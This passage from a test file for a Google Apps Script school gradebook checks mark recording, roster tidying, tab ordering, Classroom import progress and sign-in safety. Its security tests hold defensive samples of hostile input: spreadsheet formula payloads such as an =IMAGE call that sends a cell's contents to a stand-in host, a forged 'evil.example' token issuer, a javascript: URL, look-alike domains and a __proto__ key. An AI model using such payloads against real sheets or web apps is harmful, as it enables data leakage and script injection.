  const box = setupSheet().getRange(BTN_ROW.refresh, 3);
  box.setValue(true);
  onButtonTicked({ range: box });
  refreshDashboard = real;
  const said = String(setupSheet().getRange(BTN_ROW.refresh, 4).getValue());
  if (!/^❌.*pretend failure/.test(said)) throw new Error('a failure went unreported: "' + said + '"');
});

console.log('— and afterwards —');
ok &= run('the dashboard shows the marks', () => {
  refreshDashboard();
  const sh = ss.getSheetByName('Students');
  /* By heading, not by position: which column a lab occupies depends on the order of LABS
     and on what the sheet already had, and a test that counts columns breaks the day a lab
     is added — while telling you the mark is missing rather than that the test is wrong. */
  const head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0]
                 .map(h => String(h || '').replace(/^✎\s*/, '').trim());
  const col = n => { const i = head.indexOf(n); if (i < 0) throw new Error('no column "' + n + '"'); return i; };
  const row = sh.getRange(2, 1, 1, sh.getLastColumn()).getValues()[0];
  if (row[0] !== 'Ana Lee') throw new Error('wrong student first');
  if (Math.abs(row[col('Digestion')] - 1) > 1e-9) throw new Error("Ana's digestion mark is " + row[col('Digestion')]);
  if (row[col('Immunity')] !== '') throw new Error('a lab nobody has done shows a mark');
  if (row[col('Labs started')] !== 1) throw new Error('labs-done count is ' + row[col('Labs started')]);
});
ok &= run('tidy up leaves every mark alone', () => {
  const before = JSON.stringify(ss.getSheetByName('Digestion').getRange(1, 1, 4, LAB_COLS.length).getValues());
  setup();
  const after = JSON.stringify(ss.getSheetByName('Digestion').getRange(1, 1, 4, LAB_COLS.length).getValues());
  if (before !== after) throw new Error('Tidy up changed the data');
});
ok &= run('a renamed or moved pupil keeps every mark — only Name and Class are rewritten', () => {
  /* The fast path rewrites columns A:B for the WHOLE tab in one call. That is only safe if it
     writes back the sheet's own values for every row it is not deliberately changing, so this
     pins it: change a pupil's name and class on the roster, run Tidy up, and demand that their
     marks, checks, per-station text, code, email and snapshot come through untouched. */
  const dig = ss.getSheetByName('Digestion');
  const all = dig.getRange(2, 1, dig.getLastRow() - 1, LAB_COLS.length).getValues();
  let r = -1;
  for (let i = 0; i < all.length; i++) if (String(all[i][2]).trim() !== '') { r = i + 2; break; }
  if (r < 0) throw new Error('no marked row to protect');
  const email = _cleanEmail_(dig.getRange(r, LAB_EMAIL).getValue());

  /* give the row something distinctive in every column the fast path must not touch */
  dig.getRange(r, 13).setValue('KEEP-FLAGS');
  dig.getRange(r, 14).setValue('mouth 8/8 in 11 · stomach 5/9 in 4');
  dig.getRange(r, LAB_SNAP).setValue('KEEP-SNAPSHOT');
  const before = dig.getRange(r, 3, 1, LAB_COLS.length - 2).getValues()[0];   /* cols 3..17 */

  /* rename and move them on the roster */
  const stu = ss.getSheetByName('Students'), ec = _emailCol_(stu);
  const rows = stu.getRange(2, 1, stu.getLastRow() - 1, ec).getValues();
  let sr = -1;
  for (let i = 0; i < rows.length; i++) if (_cleanEmail_(rows[i][ec - 1]) === email) sr = i + 2;
  if (sr < 0) throw new Error('that pupil is not on the roster');
  const wasName = stu.getRange(sr, 1).getValue(), wasCls = stu.getRange(sr, 2).getValue();
  stu.getRange(sr, 1).setValue('Renamed Pupil');
  stu.getRange(sr, 2).setValue('11D');

  setup();                                                   /* Tidy up */

  const nowName = dig.getRange(r, 1).getValue(), nowCls = dig.getRange(r, 2).getValue();
  if (nowName !== 'Renamed Pupil') throw new Error('the new name did not reach the lab tab: ' + nowName);
  if (String(nowCls).toUpperCase() !== '11D') throw new Error('the new class did not reach the lab tab: ' + nowCls);

  const after = dig.getRange(r, 3, 1, LAB_COLS.length - 2).getValues()[0];
  if (JSON.stringify(before) !== JSON.stringify(after)) {
    throw new Error('Tidy up changed a column it must not touch:\n   was ' +
                    JSON.stringify(before) + '\n   now ' + JSON.stringify(after));
  }
  stu.getRange(sr, 1).setValue(wasName); stu.getRange(sr, 2).setValue(wasCls);
  setup();
});
ok &= run('Tidy up does NOT get slower as the roster grows', () => {
  /* It used to ask the sheet for one row and write one row PER PUPIL PER LAB, so a real school
     roster turned Tidy up into minutes. The cost must now depend on the number of LABS, not the
     number of pupils — this fails loudly if a per-pupil sheet call ever creeps back in. */
  __CALLS = 0; setup(); const small = __CALLS;
  const extra = [];
  for (let i = 0; i < 60; i++) extra.push({ name: 'Extra ' + i, email: 'extra' + i + '@x.kr', userId: 'x' + i });
  _upsertStudents_(extra, '9Z', 'Y9 Biology', 'cZ');
  __CALLS = 0; setup(); const big = __CALLS;
  /* 60 more pupils across 20 labs would have been ~2,400 extra calls the old way */
  if (big - small > 150) {
    throw new Error('Tidy up grew by ' + (big - small) + ' sheet calls for 60 more pupils (' +
                    small + ' -> ' + big + ') — something is reading or writing per pupil again');
  }
});
ok &= run('refreshDashboard twice running is the same', () => {
  refreshDashboard();
  const a = JSON.stringify(ss.getSheetByName('Students').getRange(2, 1, 3, 3 + LABS.length + 2).getValues());
  refreshDashboard();
  const b = JSON.stringify(ss.getSheetByName('Students').getRange(2, 1, 3, 3 + LABS.length + 2).getValues());
  if (a !== b) throw new Error('it drifts each time it runs');
});

console.log('\ntabs built: ' + ss.sheets.map(s => s.name).join(', '));
ok &= run('Tidy up makes the teacher-facing tabs itself, and puts them at the front', () => {
  /* they used to appear only when somebody happened to open the window that created them, which
     looked like they were missing */
  [T_HOMEWORK, T_TEACHERS, T_LINKS].forEach(n => {
    if (!ss.getSheetByName(n)) throw new Error('setup did not make ' + n);
  });
  const names = ss.getSheets().map(x => x.name);
  const lab1 = names.indexOf(LABS[0].name);
  [T_HOMEWORK, T_TEACHERS, T_LINKS].forEach(n => {
    if (names.indexOf(n) > lab1) throw new Error(n + ' sits behind the lab tabs');
  });
  if (names.indexOf('Students') > names.indexOf(T_HOMEWORK)) throw new Error('the homework tab is not after Students');
});
ok &= run('the tabs end up in syllabus order, however they started', () => {
  /* Shuffle them the way a real sheet drifts: the general tabs scattered, Digestion before
     Classification because it was built first, and the newest labs stuck on the end. */
  const shuffled = ss.getSheets().slice().reverse();
  ss.sheets.length = 0; shuffled.forEach(x => ss.sheets.push(x));
  const before = ss.getSheets().map(x => x.name).join(', ');

  const moved = _orderTabs_();

  const got = ss.getSheets().map(x => x.name);
  /* the tabs a teacher opens sit at the front, ahead of the twenty lab tabs */
  const want = ['Setup', 'Labs', 'Students', T_HOMEWORK, T_TEACHERS, T_LINKS]
                 .concat(LABS.map(l => l.name))
                 .concat(['Rejected'])
                 .filter(n => ss.getSheetByName(n));
  if (JSON.stringify(got.slice(0, want.length)) !== JSON.stringify(want)) {
    throw new Error('order is wrong.\n   was:  ' + before + '\n   want: ' + want.join(', ') +
                    '\n   got:  ' + got.join(', '));
  }
  if (got[0] !== 'Setup' || got[1] !== 'Labs' || got[2] !== 'Students') {
    throw new Error('the general tabs are not first: ' + got.slice(0, 3).join(', '));
  }
  if (got[got.length - 1] !== 'Rejected') throw new Error('Rejected is not last: ' + got[got.length - 1]);
  if (!moved) throw new Error('nothing was moved, yet the order had been reversed');
});

ok &= run('running it again moves nothing', () => {
  if (_orderTabs_() !== 0) throw new Error('it moved tabs that were already in place');
});


/* ============================================================================
   THE AUDIT — every lab in the register, not only the two that exist yet, and a
   Students tab that has been knocked about the way a real one gets knocked about.
   ============================================================================ */
console.log('— every lab in the register —');

const rowOf = (tab, email) => {
  const sh = ss.getSheetByName(tab);
  if (!sh || sh.getLastRow() < 2) return null;
  const v = sh.getRange(2, 1, sh.getLastRow() - 1, LAB_COLS.length).getValues();
  for (const r of v) if (String(r[LAB_EMAIL - 1]).toLowerCase() === email) return r;
  return null;
};

ok &= run('the register agrees with what the labs were actually built with', () => {
  const reg = JSON.parse(fs.readFileSync('../../labs-shared/labs.json', 'utf8'));
  const list = Array.isArray(reg) ? reg : (reg.labs || []);
  const wrong = [];
  list.forEach(r => {
    const mine = LABS.filter(l => l.id === r.id)[0];
    if (!mine) { wrong.push(r.id + ' is in labs.json but not in LABS'); return; }
    const want = Number(r.questions || 0), got = Number(mine.questions || 0);
    if (want && want !== got) wrong.push(r.id + ': labs.json says ' + want + ', Code.gs says ' + got);
  });
  /* A disagreement here does not refuse a hand-in — it flags every one of them "NOT ALL
     QUESTIONS", which is worse, because it looks like the student's fault. */
  if (wrong.length) throw new Error(wrong.join('; '));
});

global.TOKEN_EMAIL = 'zed@x.kr';
ok &= run('a fresh student can be added for the audit', () => {
  _upsertStudents_([{ name: 'Zed Audit', email: 'zed@x.kr', userId: 'u9' }], '9A', 'Y9 Biology', 'c1');
  if (!rowOf('Digestion', 'zed@x.kr')) throw new Error('no row waiting in Digestion');
});

/* Each lab's page stamps its own letters on a code: DL- for Digestion, CL- for Classification,
   and a lab built next term will bring its own. Only the body is ever compared, so every lab
   here deliberately uses a different prefix, including a three-letter one and none at all.
   The script used to demand "DL-" and silently refused every Classification hand-in. */
const PREFIXES = ['DL-', 'CL-', 'BIO-', '', 'X-'];

ok &= run('every lab records a hand-in, whatever letters its codes carry', () => {
  const failed = [];
  LABS.forEach((lab, i) => {
    const total = lab.questions || 50;
    const score = Math.max(1, Math.floor(total / 3));
    const code = PREFIXES[i % PREFIXES.length] + _code_(lab.id, 'Zed Audit', '9A', score + '/' + total);
    const out = hand({ app: lab.id, name: 'Zed Audit', score, total, complete: false, code });
    if (!/^recorded/.test(out)) { failed.push(lab.name + ' [' + PREFIXES[i % PREFIXES.length] + ']: ' + out); return; }
    const row = rowOf(lab.name, 'zed@x.kr');
    if (!row) { failed.push(lab.name + ': recorded, but no row carries the address'); return; }
    if (Number(row[2]) !== score || Number(row[3]) !== total) {
      failed.push(lab.name + ': tab says ' + row[2] + '/' + row[3] + ', wanted ' + score + '/' + total);
    }
  });
  if (failed.length) throw new Error(failed.length + ' of ' + LABS.length + ' labs failed:\n   ' + failed.join('\n   '));
});

ok &= run('a wrong code is still refused, for every lab', () => {
  const slipped = [];
  LABS.forEach(lab => {
    const total = lab.questions || 50;
    const out = hand({ app: lab.id, name: 'Zed Audit', score: 7, total, complete: false,
                       code: 'DL-AAAA-AAAA' });
    if (!/^rejected/.test(out)) slipped.push(lab.name + ': ' + out);
  });
  if (slipped.length) throw new Error('accepted a made-up code for: ' + slipped.join(', '));
});

ok &= run('a hand-in for every lab can be read back from its code', () => {
  const unreadable = [];
  LABS.forEach((lab, i) => {
    if (!lab.questions) return;                 /* a lab with no questions issues no codes to guess at */
    const total = lab.questions;
    const score = Math.max(1, Math.floor(total / 3));
    const code = PREFIXES[i % PREFIXES.length] + _code_(lab.id, 'Zed Audit', '9A', score + '/' + total);
    const answer = askAbout(code);
    if (!/Zed Audit/.test(answer)) unreadable.push(lab.name + ': ' + answer.slice(0, 90));
  });
  if (unreadable.length) throw new Error(unreadable.join('\n   '));
});

console.log('— a Students tab that has been knocked about —');

ok &= run('Tidy up clears repeated columns, keeps ones with data, and cleans addresses', () => {
  const sh = ss.getSheetByName('Students');
  const head = () => sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0]
                       .map(h => String(h || '').replace(/^✎\s*/, '').trim());
  const emailCol = () => head().indexOf('School email') + 1;
  const marksBefore = ss.getSheetByName('Digestion')
    .getRange(2, 1, ss.getSheetByName('Digestion').getLastRow() - 1, LAB_COLS.length).getValues();

  /* the damage, exactly as it turned up on the real sheet */
  const n = sh.getLastColumn();
  sh.insertColumnsAfter(sh.getMaxColumns(), 4);          /* room to make a mess in */
  sh.getRange(1, n + 1).setValue('Classroom user id');     /* a repeat, with nothing under it */
  sh.getRange(1, n + 2).setValue('Course id');             /* the same */
  sh.getRange(1, n + 3).setValue('Old Topic 22');          /* a lab taken out of LABS... */
  sh.getRange(2, n + 3).setValue('41');                    /* ...that still holds a mark */
  const ec = emailCol();
  /* Zed's OWN row, found by name. One student's address on another's row is a different
     fault, and the roster check is what catches that one. Note the space here is a
     non-breaking one, which is what a paste from a web page actually carries. */
  const names = sh.getRange(2, 1, sh.getLastRow() - 1, 1).getValues().map(r => String(r[0]));
  const zedRow = names.indexOf('Zed Audit') + 2;
  if (zedRow < 2) throw new Error('cannot find Zed on the roster');
  sh.getRange(zedRow, ec).setValue('  ZED@x.kr ');         /* pasted, with a space each side */

  const report = setup();

  const h = head();
  const count = (name) => h.filter(x => x === name).length;
  if (count('Classroom user id') !== 1) throw new Error('the repeated column is still there: ' + h.join(' | '));
  if (count('Course id') !== 1) throw new Error('the repeated Course id is still there');
  if (count('Old Topic 22') !== 1) throw new Error('a column holding a mark was deleted — that must never happen');
  if (!/Kept, because there is still something/.test(report)) throw new Error('it did not say what it kept: ' + report);
  if (!/Old Topic 22/.test(report)) throw new Error('it kept the column but did not name it: ' + report);

  const cleaned = String(sh.getRange(zedRow, emailCol()).getValue());
  if (cleaned !== 'zed@x.kr') throw new Error('the address was not cleaned: ' + JSON.stringify(cleaned));
  if (!/address/.test(report)) throw new Error('it cleaned an address without saying so: ' + report);

  const marksAfter = ss.getSheetByName('Digestion')
    .getRange(2, 1, ss.getSheetByName('Digestion').getLastRow() - 1, LAB_COLS.length).getValues();
  if (JSON.stringify(marksAfter) !== JSON.stringify(marksBefore)) throw new Error('a mark moved during Tidy up');
});

ok &= run('a cleaned address still finds the same row — no duplicate is made', () => {
  const dg = ss.getSheetByName('Digestion');
  const before = dg.getLastRow();
  const out = hand({ app: 'digestion-lab', name: 'Zed Audit', score: QN, total: QN, complete: true,
                     code: 'DL-' + _code_('digestion-lab', 'Zed Audit', '9A', QN + '/' + QN) });
  if (!/^recorded/.test(out)) throw new Error('refused after the address was cleaned: ' + out);
  if (dg.getLastRow() !== before) throw new Error('it made a second row for the same student');
});

ok &= run('two rows sharing one address are reported, and nothing is deleted', () => {
  /* This is not hypothetical: it is what happens when a name is added by hand and the address
     is copied from the row above. The first row wins every hand-in, and the second student's
     name is written over the first one's on every lab tab — marks appearing to move between
     people. Nothing can be deleted safely, so it has to be said out loud. */
  const sh = ss.getSheetByName('Students');
  const head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0]
                 .map(h => String(h || '').replace(/^✎\s*/, '').trim());
  const ec = head.indexOf('School email') + 1;
  const rows = sh.getLastRow() - 1;
  const before = sh.getRange(2, ec, rows, 1).getValues();
  const mine = String(before[0][0]);

  sh.getRange(3, ec).setValue(mine);                 /* row 3 now claims row 2's address */
  const report = setup();

  if (!/TWO ROWS SHARE ONE ADDRESS/.test(report)) throw new Error('it said nothing: ' + report);
  if (!new RegExp(mine.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).test(report)) {
    throw new Error('it did not name the address: ' + report);
  }
  if (sh.getLastRow() - 1 !== rows) throw new Error('a row was removed — that must never happen');

  sh.getRange(2, ec, rows, 1).setValues(before);     /* put the roster back */
  setup();
});

console.log('— taking somebody off the Students tab —');

const studentsRowOf = (name) => {
  const sh = ss.getSheetByName('Students');
  const v = sh.getRange(2, 1, sh.getLastRow() - 1, 1).getValues().map(r => String(r[0]));
  return v.indexOf(name) + 2;
};

ok &= run('TEST is always an accepted class', () => {
  const list = _classList_();
  if (list.indexOf('TEST') < 0) throw new Error('TEST is not offered: ' + list.join(', '));
});

ok &= run('a row of your own with class TEST survives Tidy up', () => {
  const sh = ss.getSheetByName('Students');
  const head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0]
                 .map(h => String(h || '').replace(/^✎\s*/, '').trim());
  const ec = head.indexOf('School email') + 1;
  const r = sh.getLastRow() + 1;
  sh.getRange(r, 1).setValue('Dr Tester');
  sh.getRange(r, 2).setValue('TEST');
  sh.getRange(r, ec).setValue('tester@x.kr');
  setup();
  const back = studentsRowOf('Dr Tester');
  if (back < 2) throw new Error('the row was removed');
  if (String(sh.getRange(back, 2).getValue()) !== 'TEST') throw new Error('the class was changed');
  /* and the point of adding a row by hand: it reaches every lab tab */
  const missing = LABS.filter(l => !rowOf(l.name, 'tester@x.kr')).map(l => l.name);
  if (missing.length) throw new Error('no row on: ' + missing.join(', '));
});

ok &= run('removing them from Students removes them from every lab tab', () => {
  const sh = ss.getSheetByName('Students');
  const r = studentsRowOf('Dr Tester');
  if (r < 2) throw new Error('setup for this test is wrong');
  sh.deleteRows(r, 1);
  const report = setup();
  const left = LABS.filter(l => rowOf(l.name, 'tester@x.kr')).map(l => l.name);
  if (left.length) throw new Error('still on: ' + left.join(', '));
  if (!/removed from/.test(report)) throw new Error('it did not say it had done it: ' + report);
});

ok &= run('somebody removed from Students but holding marks is KEPT and named', () => {
  const sh = ss.getSheetByName('Students');
  const head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0]
                 .map(h => String(h || '').replace(/^✎\s*/, '').trim());
  const ec = head.indexOf('School email') + 1;
  const r = sh.getLastRow() + 1;
  sh.getRange(r, 1).setValue('Left School');
  sh.getRange(r, 2).setValue('9A');
  sh.getRange(r, ec).setValue('gone@x.kr');
  setup();

  global.TOKEN_EMAIL = 'gone@x.kr';
  const out = hand({ app: 'digestion-lab', name: 'Left School', score: 12, total: QN,
                     complete: false, code: 'DL-' + _code_('digestion-lab', 'Left School', '9A', '12/' + QN) });
  if (!/^recorded/.test(out)) throw new Error('could not set the test up: ' + out);
  global.TOKEN_EMAIL = 'zed@x.kr';

  sh.deleteRows(studentsRowOf('Left School'), 1);
  const report = setup();

  const stillThere = rowOf('Digestion', 'gone@x.kr');
  if (!stillThere) throw new Error('a row holding marks was deleted — that must never happen');
  if (Number(stillThere[2]) !== 12) throw new Error('the mark changed: ' + stillThere[2]);
  if (!/Left School/.test(report)) throw new Error('it kept the row but did not say so: ' + report);
  /* and the empty rows on every other lab did go */
  const emptyLeft = LABS.filter(l => l.name !== 'Digestion' && rowOf(l.name, 'gone@x.kr')).map(l => l.name);
  if (emptyLeft.length) throw new Error('empty rows left behind on: ' + emptyLeft.join(', '));
});

ok &= run('a second class can be imported after the sheet has been trimmed', () => {
  /* Formatting trims every tab to six spare rows. A fresh sheet's thousand rows hide this,
     so it only shows up on the SECOND import: writing past the last row throws, and the
     import dies part way with some tabs done and some not. */
  setup();                                     /* trim everything down first */
  const dg = ss.getSheetByName('Digestion');
  const spare = dg.getMaxRows() - dg.getLastRow();
  if (spare > 20) throw new Error('the tab was not trimmed, so this proves nothing: ' + spare + ' spare rows');

  const newLot = [];
  for (let i = 0; i < 25; i++) newLot.push({ name: 'New Kid ' + i, email: 'new' + i + '@x.kr', userId: 'n' + i });
  _upsertStudents_(newLot, '9Z', 'Y9 Biology Z', 'cz');

  const missing = LABS.filter(l => !rowOf(l.name, 'new24@x.kr')).map(l => l.name);
  if (missing.length) throw new Error('the last of them never reached: ' + missing.join(', '));
  setup();
  const stillMissing = LABS.filter(l => !rowOf(l.name, 'new24@x.kr')).map(l => l.name);
  if (stillMissing.length) throw new Error('Tidy up lost them again: ' + stillMissing.join(', '));

  /* put the roster back so the later tests see what they expect */
  const sh = ss.getSheetByName('Students');
  const head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0]
                 .map(h => String(h || '').replace(/^✎\s*/, '').trim());
  const ec = head.indexOf('School email') + 1;
  const addr = sh.getRange(2, ec, sh.getLastRow() - 1, 1).getValues().map(r => String(r[0]));
  for (let i = addr.length - 1; i >= 0; i--) if (/^new\d+@x\.kr$/.test(addr[i])) sh.deleteRows(i + 2, 1);
  setup();
});

console.log('— importing from Classroom —');

ok &= run('an import says what it is doing, and only says done when it is', () => {
  /* The complaint this fixes: the dialog was told the job had finished BEFORE the long part
     started, so it sat there looking done while the script formatted twenty tabs in silence. */
  cacheWrites.length = 0;
  global.Classroom = {
    Courses: {
      list: () => ({ courses: [{ id: 'c7', name: 'Y9 Biology', section: 'Set 3' }] }),
      Students: { list: () => ({ students: [
        { userId: 'i1', profile: { name: { fullName: 'Imported One' }, emailAddress: ' Imp1@X.KR ' } },
        { userId: 'i2', profile: { name: { fullName: 'Imported Two' }, emailAddress: 'imp2@x.kr' } }
      ] }) }
    }
  };
  let out;
  try {
    out = executeBatchImportAll([{ courseId: 'c7', classCode: '9Y', courseName: 'Y9 Biology' }], 'job1');
  } finally {
    global.Classroom = undefined;
  }

  /* exactly what the dialog would have read, in the order it would have read it */
  const seen = cacheWrites
    .filter(([k]) => k === 'BATCH_IMPORT_job1')
    .map(([, v]) => JSON.parse(v))
    .map(o => ({ done: !!o.done, phase: o.phase || '' }));
  if (!seen.length) throw new Error('the dialog was told nothing at all');

  if (!out || out[0].status !== 'success') throw new Error('the import itself failed: ' + JSON.stringify(out));
  const last = seen[seen.length - 1];
  if (!last.done) throw new Error('it never said it had finished');
  const doneEarly = seen.slice(0, -1).filter(x => x.done);
  if (doneEarly.length) throw new Error('it said done ' + doneEarly.length + ' time(s) before it had finished');
  if (!seen.some(x => !x.done && /formatting/i.test(x.phase))) {
    throw new Error('it never said it was formatting: ' + JSON.stringify(seen.map(x => x.phase)));
  }
  if (!seen.some(x => !x.done && /Giving everyone a row/.test(x.phase))) {
    throw new Error('the per-lab steps never reached the dialog: ' + JSON.stringify(seen.map(x => x.phase)));
  }

  const p = getBatchImportProgress('job1');
  if (!p || !p.done) throw new Error('the dialog could not read the finished state back');

  /* and the addresses came in clean, spaces and capitals and all */
  if (!rowOf('Digestion', 'imp1@x.kr')) throw new Error('a pasted-looking address did not land clean');
});

console.log('— a lab added in the middle of the year —');

ok &= run('adding a lab keeps every mark exactly where it was', () => {
  refreshDashboard();          /* settle the dashboard first, or its own catching-up looks like damage */
  const dg = ss.getSheetByName('Digestion');
  const marksBefore = dg.getRange(2, 1, dg.getLastRow() - 1, LAB_COLS.length).getValues();
  const stu = ss.getSheetByName('Students');
  const headBefore = stu.getRange(1, 1, 1, stu.getLastColumn()).getValues()[0]
                        .map(h => String(h || '').replace(/^✎\s*/, '').trim());
  const digCol = headBefore.indexOf('Digestion');
  const digBefore = stu.getRange(2, digCol + 1, stu.getLastRow() - 1, 1).getValues();

  LABS.push({ id: 'brand-new-lab', name: 'Brand New', topic: '22 · Something new', questions: 0 });
  setup();

  const headAfter = stu.getRange(1, 1, 1, stu.getLastColumn()).getValues()[0]
                       .map(h => String(h || '').replace(/^✎\s*/, '').trim());
  if (headAfter.indexOf('Brand New') < 0) throw new Error('the new lab got no column');
  if (!ss.getSheetByName('Brand New')) throw new Error('the new lab got no tab');

  const digAfter = stu.getRange(2, headAfter.indexOf('Digestion') + 1, stu.getLastRow() - 1, 1).getValues();
  if (JSON.stringify(digAfter) !== JSON.stringify(digBefore)) {
    throw new Error('the Digestion column moved but its figures did not follow it');
  }
  const marksAfter = dg.getRange(2, 1, dg.getLastRow() - 1, LAB_COLS.length).getValues();
  if (JSON.stringify(marksAfter) !== JSON.stringify(marksBefore)) {
    const diff = [];
    marksAfter.forEach((row, r) => row.forEach((v, c) => {
      const was = (marksBefore[r] || [])[c];
      if (JSON.stringify(v) !== JSON.stringify(was)) {
        diff.push('row ' + (r + 2) + ' "' + LAB_COLS[c].h + '": ' +
                  JSON.stringify(was) + ' -> ' + JSON.stringify(v));
      }
    }));
    throw new Error('a mark changed:\n   ' + diff.join('\n   '));
  }

  LABS.pop();                                   /* leave the register as it was found */
});

ok &= run('a lab taken back out leaves its marks alone and says so', () => {
  const report = setup();
  const stu = ss.getSheetByName('Students');
  const h = stu.getRange(1, 1, 1, stu.getLastColumn()).getValues()[0]
               .map(x => String(x || '').replace(/^✎\s*/, '').trim());
  /* Brand New has no marks under it, so it is cleared away quietly. Old Topic 22 has one, so
     it stays — that is the rule the whole repair works to. */
  if (h.indexOf('Brand New') >= 0) throw new Error('an empty column for a removed lab was left behind');
  if (h.indexOf('Old Topic 22') < 0) throw new Error('a column holding a mark was removed');
  if (!/Old Topic 22/.test(report)) throw new Error('it stopped naming what it kept: ' + report);
});

console.log('— signing in, safely —');
ok &= run('junk and other apps\' sign-ins are turned away without asking Google', () => {
  const before = FETCHES;
  const say = (t) => String(doPost({ postData: { contents: JSON.stringify({ app: 'digestion-lab', token: t, score: 1, total: 1 }) } }));
  const outs = [say('tok'), say('a.b.c'), say(jwt({ aud: 'SOMEBODY-ELSE', exp: Math.floor(Date.now() / 1000) + 3600 })),
                say(jwt({ aud: 'CID', exp: Math.floor(Date.now() / 1000) - 10 }))];
  outs.forEach(o => { if (o !== 'not recorded: not signed in') throw new Error('answered ' + o); });
  if (FETCHES !== before) throw new Error((FETCHES - before) + ' call(s) to Google for junk');
});
ok &= run('a token Google does not stand behind is refused, and not asked about twice', () => {
  const was = TOKEN_ISS; TOKEN_ISS = 'https://evil.example';
  const t = jwt({ aud: 'CID', exp: Math.floor(Date.now() / 1000) + 3600, n: 1 });
  const say = () => String(doPost({ postData: { contents: JSON.stringify({ app: 'digestion-lab', token: t, score: 1, total: 1 }) } }));
  const before = FETCHES;
  const a = say(), b = say();
  TOKEN_ISS = was;
  if (a !== 'not recorded: not signed in' || b !== a) throw new Error('answered ' + a + ' / ' + b);
  if (FETCHES - before !== 1) throw new Error('asked Google ' + (FETCHES - before) + ' times');
});
ok &= run('nothing a page sends can become a formula in the sheet', () => {
  const was = TOKEN_EMAIL; TOKEN_EMAIL = 'ana@x.kr';          /* an earlier test signed in as somebody else */
  const code = _code_('digestion-lab', 'Ana Lee', '9A', QN + '/' + QN);
  ss.getSheetByName('Digestion').getRange(2, 3).setValue('');   /* so this hand-in beats her best, and every column is written */
  hand({ score: QN, total: QN, code: code, snap: '=IMAGE("https://example.invalid/?"&A1)',
         stations: { '=HYPERLINK("x")': '1/1' } });
  const row = anaRow();
  if (row[LAB_SNAP - 1] !== '\'=IMAGE("https://example.invalid/?"&A1)') throw new Error('snap stored as ' + row[LAB_SNAP - 1]);
  /* a station id that is not an id is now DROPPED rather than merely escaped — the formula never
     reaches the cell at all, which is stronger than the apostrophe. It also stops a station called
     __proto__ reaching the teacher page's roll-up object. */
  if (/HYPERLINK|^'?=/.test(String(row[13]))) throw new Error('a formula-shaped station id reached the cell: ' + row[13]);
  if (String(row[13]) !== '') throw new Error('expected the bad station to be dropped, got ' + row[13]);
  if (_stations_({ '__proto__': '1/1', 'mouth': '8/8 in 3' }) !== 'mouth 8/8 in 3') {
    throw new Error('__proto__ was not refused: ' + _stations_({ '__proto__': '1/1', 'mouth': '8/8 in 3' }));
  }
  if (_stations_({ ok: 'x'.repeat(500) }).length > 900) throw new Error('an oversized station string was not capped');
  hand({ score: 1, total: 1, code: '=IMPORTXML("https://example.invalid","//a")' });
  const rj = ss.getSheetByName('Rejected');
  const last = rj.getRange(rj.getLastRow(), 1, 1, 9).getValues()[0];
  if (last[6] !== '\'=IMPORTXML("https://example.invalid","//a")') throw new Error('rejected code stored as ' + last[6]);
  if (_plain_('CL-ABCD-EFGH') !== 'CL-ABCD-EFGH' || _plain_('ana~9:21') !== 'ana~9:21') throw new Error('ordinary text was changed');
  TOKEN_EMAIL = was;
});
ok &= run('an error never shows a file id', () => {
  const said = String(doPost({ postData: { contents: '{not json' } }));
  if (!/^error: /.test(said)) throw new Error('said ' + said);
  const redacted = 'error: ' + String('Exception: failed while accessing document with id 1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789').replace(/[A-Za-z0-9_-]{25,}/g, '…');
  if (/1AbCdEfGh/.test(redacted)) throw new Error('id kept');
});

console.log('— school accounts and teachers —');
ok &= run('pupils (a sub-domain) and staff are both the school\'s; look-alikes are not', () => {
  const yes = ['a@x.kr', 'b@pupils.x.kr', 'c@deep.pupils.x.kr'], no = ['d@evilx.kr', 'e@x.kr.evil.com', 'f@gmail.com', 'nobody'];
  yes.forEach(e => { if (!_inDomain_(e, 'x.kr')) throw new Error(e + ' refused'); });
  no.forEach(e => { if (_inDomain_(e, 'x.kr')) throw new Error(e + ' accepted'); });
  if (_inDomain_('a@x.kr', '')) throw new Error('an empty domain accepted somebody');
});
ok &= run('a teacher is the owner, or on TEACHERS at the school\'s own domain — never a pupil', () => {
  SCHOOL_DOMAIN = 'x.kr'; TEACHERS = 'colleague@x.kr, pupil@pupils.x.kr, outsider@gmail.com';
  if (!_isTeacher_(OWNER)) throw new Error('the owner is not a teacher');
  if (!_isTeacher_('Colleague@X.kr ')) throw new Error('a listed colleague is not');
  if (_isTeacher_('pupil@pupils.x.kr')) throw new Error('a pupil on the list became a teacher');
  if (_isTeacher_('outsider@gmail.com')) throw new Error('a personal account on the list became a teacher');
  if (_isTeacher_('other@x.kr')) throw new Error('an unlisted member of staff became a teacher');
  TEACHERS = ''; if (!_isTeacher_('colleague@x.kr')) throw new Error('an empty line forgot the saved list');
  TEACHERS = 'none'; if (_isTeacher_('colleague@x.kr') || !_isTeacher_(OWNER)) throw new Error('"none" did not leave only the owner');
  TEACHERS = ''; SCHOOL_DOMAIN = '';
  props.delete('TEACHERS'); props.delete('SCHOOL_DOMAIN');
});
ok &= run('the teacher page address must be a web app, and points at the page', () => {
  TEACHER_PAGE_URL = 'https://script.google.com/a/macros/x.kr/s/AKfyTEST/exec';
  if (_teacherPageUrl_() !== 'https://script.google.com/a/macros/x.kr/s/AKfyTEST/exec?page=teachers') throw new Error(_teacherPageUrl_());
  TEACHER_PAGE_URL = 'https://evil.example/exec'; if (_teacherPageUrl_() !== '') throw new Error('accepted ' + _teacherPageUrl_());
  TEACHER_PAGE_URL = 'javascript:alert(1)//script.google.com/x/exec'; if (_teacherPageUrl_() !== '') throw new Error('accepted javascript:');
  TEACHER_PAGE_URL = ''; props.delete('TEACHER_PAGE_URL');
});
ok &= run('the teacher page shows nothing to nobody, to a pupil, or to unlisted staff', () => {
  SCHOOL_DOMAIN = 'x.kr';
  setUpTeacherPage_.length;                      /* exists */
  /* setup() now makes this tab itself, so clear any existing one before planting the old shape */
  { const old = ss.getSheetByName(T_LINKS); if (old) ss.deleteSheet(old); }
  const tab = ss.insertSheet(T_LINKS);
  tab.getRange(1, 1, 4, 4).setValues([['Section', 'Name', 'Link', 'Note'],
